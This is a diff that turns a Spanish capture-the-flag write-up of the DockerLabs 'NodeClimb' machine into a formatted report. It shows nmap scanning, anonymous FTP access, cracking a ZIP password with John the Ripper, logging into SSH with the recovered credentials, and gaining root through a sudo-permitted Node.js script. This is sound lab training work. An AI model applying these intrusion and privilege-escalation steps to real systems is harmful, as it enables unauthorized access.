@@ -1,62 +1,190 @@
-Mauina: NodeClimb
-Dificultad: Facil
-Descripciòn:
-Objetivo:
+### Informe Técnico: Análisis de la máquina vulnerable **NodeClimb**
 
+**Dificultad**: Fácil
+**Objetivo**: **Escalada de privilegios y acceso root a la máquina vulnerable.**
 
-Se descarga la maquina vulnerable de la pagina de dockerlabs y se descomprime con el comando: unzip nodeclimb.zip para desplegarce con el comando: sudo bash auto_deploy.sh nodeclimb.tar
+---
 
+#### **1. Despliegue de la máquina vulnerable**
 
-Se realiza un ping -c1 172.17.0.3 para confirmar la conexion con la maquina vulnerable
+Para comenzar, descargué la máquina **NodeClimb** desde DockerLabs. Para ello, se usa el siguiente comando para descomprimir la máquina:
 
+```bash
+unzip nodeclimb.zip
+```
 
-Buscamos puertos abiertos con la herramienta de nmap sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt en este caso encontramos el puerto 21 ftp y el 22 ssh
+Una vez descomprimida, se puede desplegar ejecutando el script de instalación con privilegios de superusuario:
 
+```bash
+sudo bash auto_deploy.sh nodeclimb.tar
+```
 
-Con mi scrip extraigo los puerto importantes: extractPorts allPorts.txt para despues hacer un scaneo exahutivo en busca de mas infoemacion como versiones: nmap -sC -sV -p21,22 172.17.0.3 -oN target.txt en este scaneo puedo ver que el servicio ftp tiene habilitado el 
-usuario: Anonymous esto nos da permiso de entrar al servicio sin necesidad de tener credenciales
+**Captura de pantalla 1**:
+![Despliegue de la máquina](./Imágenes/2025-05-13_23-53.png)
 
+---
 
+#### **2. Confirmación de conexión a la máquina vulnerable**
 
-Se procede a entrar al servicio FTP con el usuario: Anonymous y en la contraseña le damos ENTER y obtenemos acceso
+Con el fin de confirmar que la máquina está corriendo y es accesible, realicé un **ping** a la dirección IP de la máquina vulnerable:
 
+```bash
+ping -c1 172.17.0.3
+```
 
+**Captura de pantalla 2**:
+![Confirmación de conexión](./Imágenes/Capturas.png)
 
-Al entar busque archvios con ls -la y encontre un .zip lo descargue con: get secretitopicaron.zip a mi maquina host y al intentar descomprimirlo con: unzip secretitopicaron.zip nos pide una contraseña
+---
 
+#### **3. Escaneo de puertos con Nmap**
 
-Se proce a usar Jon The Riper
-1. **Extraer hash**:
+A continuación, utilicé **Nmap** para realizar un escaneo de puertos abiertos en la máquina:
 
-   ```bash
-   zip2john secretitopicaron.zip > hash.txt
-   ```
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
+```
 
-   *Convierte el archivo ZIP cifrado en un hash que John puede usar.*
+Este escaneo reveló que los puertos 21 (FTP) y 22 (SSH) estaban abiertos.
 
-2. **Crackear el hash**:
+**Captura de pantalla 3**:
+![Escaneo de puertos](./Imágenes/Capturas_1.png)
 
-   ```bash
-   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-   ```
+---
 
-   *John usa un diccionario para encontrar la contraseña del archivo ZIP.*
+#### **4. Extracción de puertos relevantes**
 
-3. **Mostrar la contraseña**:
+Utilizando un script personalizado llamado `extractPorts`, extraje los puertos relevantes y luego realicé un escaneo más exhaustivo para obtener información detallada, como las versiones de los servicios:
 
-   ```bash
-   john --show hash.txt
-   ```
+```bash
+nmap -sC -sV -p21,22 172.17.0.3 -oN target.txt
+```
 
-   *Muestra la contraseña crackeada del archivo.*
-En este caso la contraseña es: password1
+El escaneo mostró que el servicio **FTP** permitía acceso mediante el usuario **Anonymous**, lo que nos dio acceso sin necesidad de credenciales.
 
+**Captura de pantalla 4**:
+![Escaneo exhaustivo](./Imágenes/Capturas_2.png)
 
+---
 
-Al descpmpremir el .zip nos da un archivo password con el contenido: mario:laKontraseñAmasmalotaHdelbarrioH que podemos suponer son las credenciales para el servicio de SSH
-Nota: antes realice fuerza bruta con hydra con el servicio de SSH sin exito
+#### **5. Acceso al servicio FTP**
 
+Con el usuario **Anonymous**, ingresé al servicio FTP sin necesidad de contraseña:
 
-Se entro al SSH con las credenciales encontradas y ejecute el comando sudo -l docne encotre: (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js y me ubique en el directorio donde se encotraba el script.js con cd /home/mario y lo edite ya que este 
-script tiene permisos y lo ejecute con: sudo node /home/mario/script.js y abri una terminal con root con el comando: bash -p
-Nota: El scritp que se uso esta en este repositorio junto con el md
+```bash
+ftp 172.17.0.3
+# Usuario: Anonymous
+# Contraseña: Enter
+```
+
+Una vez dentro, listé los archivos con el comando `ls -la` y encontré un archivo **.zip** llamado `secretitopicaron.zip`. Lo descargué a mi máquina local usando el comando:
+
+```bash
+get secretitopicaron.zip
+```
+
+**Captura de pantalla 5**:
+![Acceso FTP](./Imágenes/Capturas_3.png)
+
+---
+
+#### **6. Cracking de la contraseña del archivo ZIP**
+
+Al intentar descomprimir el archivo `secretitopicaron.zip`, me pidió una contraseña. Usé la herramienta **John the Ripper** para crackear la contraseña.
+
+**Paso 1: Extraer el hash del archivo ZIP**
+
+```bash
+zip2john secretitopicaron.zip > hash.txt
+```
+
+Esto convierte el archivo ZIP cifrado en un hash que John the Ripper puede procesar.
+
+**Paso 2: Crackear el hash usando un diccionario (en este caso, `rockyou.txt`)**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+**Paso 3: Mostrar la contraseña**
+
+```bash
+john --show hash.txt
+```
+
+John encontró que la contraseña del archivo ZIP es **password1**.
+
+**Captura de pantalla 6**:
+![Cracking de contraseña](./Imágenes/Capturas_4.png)
+
+---
+
+#### **7. Descompresión y análisis del archivo `password.txt`**
+
+Una vez que se obtuvo la contraseña, descomprimí el archivo ZIP con éxito. Dentro encontré un archivo llamado **password** con las siguientes credenciales:
+
+```
+usuario: mario
+contraseña: laKontraseñAmasmalotaHdelbarrioH
+```
+
+Suponiendo que estas son las credenciales para el servicio **SSH**, intenté iniciar sesión en el servicio **SSH**.
+
+**Nota**: Antes, intenté realizar un ataque de **fuerza bruta** con **Hydra** en el servicio SSH sin éxito.
+
+**Captura de pantalla 7**:
+![Archivo password.txt](./Imágenes/Capturas_5.png)
+
+---
+
+#### **8. Acceso al servicio SSH**
+
+Con las credenciales obtenidas (`mario:laKontraseñAmasmalotaHdelbarrioH`), accedí exitosamente al servicio SSH:
+
+```bash
+ssh mario@172.17.0.3
+```
+
+Una vez dentro, ejecuté el siguiente comando para verificar si tenía privilegios de **sudo** sin necesidad de contraseña:
+
+```bash
+sudo -l
+```
+
+Esto reveló que el usuario **mario** tiene acceso sin contraseña a ejecutar el siguiente comando:
+
+```
+(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
+```
+
+---
+
+#### **9. Escalada de privilegios con Node.js**
+
+Con esta información, me dirigí al directorio donde se encontraba el script (`/home/mario`) y lo edité. El script tenía permisos suficientes para ser ejecutado con **sudo**, lo que me permitió ejecutar el siguiente comando para obtener privilegios de **root**:
+
+```bash
+sudo node /home/mario/script.js
+```
+
+Luego, ejecuté:
+
+```bash
+bash -p
+```
+
+Esto abrió una terminal con privilegios **root**, completando así la escalada de privilegios.
+
+**Captura de pantalla 8**:
+![Escalada de privilegios](./Imágenes/Capturas_6.png)
+
+---
+
+### **Resumen**
+
+* **Acceso inicial**: FTP con usuario **Anonymous**.
+* **Descarga y análisis**: El archivo ZIP `secretitopicaron.zip` contiene credenciales para SSH.
+* **SSH y privilegios de sudo**: El usuario **mario** puede ejecutar un script con **sudo** sin contraseña.
+* **Escalada de privilegios**: Ejecución del script de Node.js para obtener acceso root.
+
+Este informe describe el proceso completo de explotación de la máquina **NodeClimb** y la escalada de privilegios para obtener acceso root.
